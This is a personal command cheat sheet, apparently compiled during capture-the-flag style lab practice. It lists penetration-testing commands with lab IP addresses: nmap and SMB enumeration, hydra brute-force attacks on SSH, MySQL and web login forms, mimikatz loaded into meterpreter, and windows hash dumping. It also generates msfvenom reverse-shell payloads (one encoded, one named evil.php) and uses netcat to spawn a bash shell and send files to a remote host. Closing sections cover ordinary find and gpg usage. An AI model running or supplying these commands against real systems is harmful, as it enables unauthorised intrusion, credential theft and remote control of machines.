# msfconsole: there is connect cmd to quickly check connection to something
connect 8.8.8.8 53
# msfconsole: write output of the last commend to a file
spool /tmp/windows.hashdump
# msfconsole: save current settings like used module, its options and so on
save
# meterpreter: load mimikatz into the meterpreter session
load kiwi
# ffuz: discover dns virtual hosts using dictionary attack
ffuf -fs 2395 -w ~/happons/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.236.148
# arp-scan: of local network (ip range is calculated from ip and mask of eth0
arp-scan --interface=eth0 --localnet
# nmap: Search for MS-* vulnerabilites using NSE scripts and nmap
nmap --script smb-vuln-ms* -sV -v -p445 -Pn 10.10.69.177
# namp: Enumerate SMB shares and users
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.15.147
# hydra: dictionary brute-force on ssh using pubkey auth instead of passwords
hydra -I -V -l kali -p id_rsa sshkey://192.168.1.4
# hydra: Try to brute-force mysql database access
hydra -I -V -s 13306 -L usernames.txt -P passwords.txt mysql://172.16.64.81
# hydra: Brute force http-post-form "url:post-data:fail-string"
hydra -t64 -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.74.121 http-post-form "/Account/login.aspx:UserName=^USER^&Password=^PASS^:Login failed"
# ip-route-add: Route all packets to 10.85.174.0/24 via default GW 192.168.193.4 and interface tap0
ip route add 10.85.174.0/24 via 192.168.193.4 dev tap0
# msfconsole: Check if a machine is a virtual machine
windows/gather/checkvm
# msfconsole: Try to suggest some local exploits that could be used
post/multi/recon/local_exploit_suggester
# msfvenom: Generate a reverse tcp payload for a windows machine
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.221 LPORT=3333 -e x86/shikata_ga_nai -f exe -o Advanced.exe
# msfvenom: Create PHP payload that will call home and pops up meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.13.37.10 LPORT=4444 -f raw -o evil.php
# nc: Create a bash process and connect its stdin/out to a network pipe using netcat (reverse shell)
nc -l -p 1337 -e /bin/bash
# nc: Send file nc.sh to server and save it as data.txt
nc -l -p 8080 > data.txt        # server listener
cat nc.sh | nc 10.0.0.1 8080    # client sending file
# net: Show all user accounts
net user

# smbclient: Connect share WorkSharing without login
smbclient //192.168.193.211/WorkSharing -N
# smbget: Recursively download files from an SMB share
smbget -R smb://10.10.15.147/anonymous

# nmap: -sL will simply list targets that will be scanned
nmap -n -v -sL 10.10.0-255.101-125


# nmap: ARP scan
sudo nmap -PR -sn MACHINE_IP/24
# nmap: ICMP Echo Scan
sudo nmap -PE -sn MACHINE_IP/24
# nmap: ICMP Timestamp Scan
sudo nmap -PP -sn MACHINE_IP/24
# nmap: ICMP Address Mask Scan
sudo nmap -PM -sn MACHINE_IP/24
# nmap: TCP SYN Ping Scan
sudo nmap -PS22,80,443 -sn MACHINE_IP/30
# nmap: TCP ACK Ping Scan
sudo nmap -PA22,80,443 -sn MACHINE_IP/30
# nmap: UDP Ping Scan
sudo nmap -PU53,161,162 -sn MACHINE_IP/30
# nmap: -F for faster then usual scan (less ports)
nmap -v -F -sT 10.10.166.115


# find: find executable files
find / -perm a=x
# find:  find all files for user “frank” under “/home”
find /home -user frank
# find: find files that were modified in the last 10 days
find / -mtime 10
# find: find files that were accessed in the last 10 day
find / -atime 10
# find: find files changed within the last hour (60 minutes)
find / -cmin -60
# find: find files accesses within the last hour (60 minutes)
find / -amin -60
# find: find files with a 50 MB size
find / -size 50M
# use iname to find case-insensitive file name pattern
find . -iname "File*"
# search for files with modified time newer then ...
find . -type f -newermt '11/19/2021 21:00:00'
# find files modified between 09/12/2013 and 09/14/2013
find / -type f -newermt 2013-09-12 ! -newermt 2013-09-14

# enrypt a file with symmetric AES-256 algorithm
gpg --cipher-algo AES-256 --symmetric secret.txt
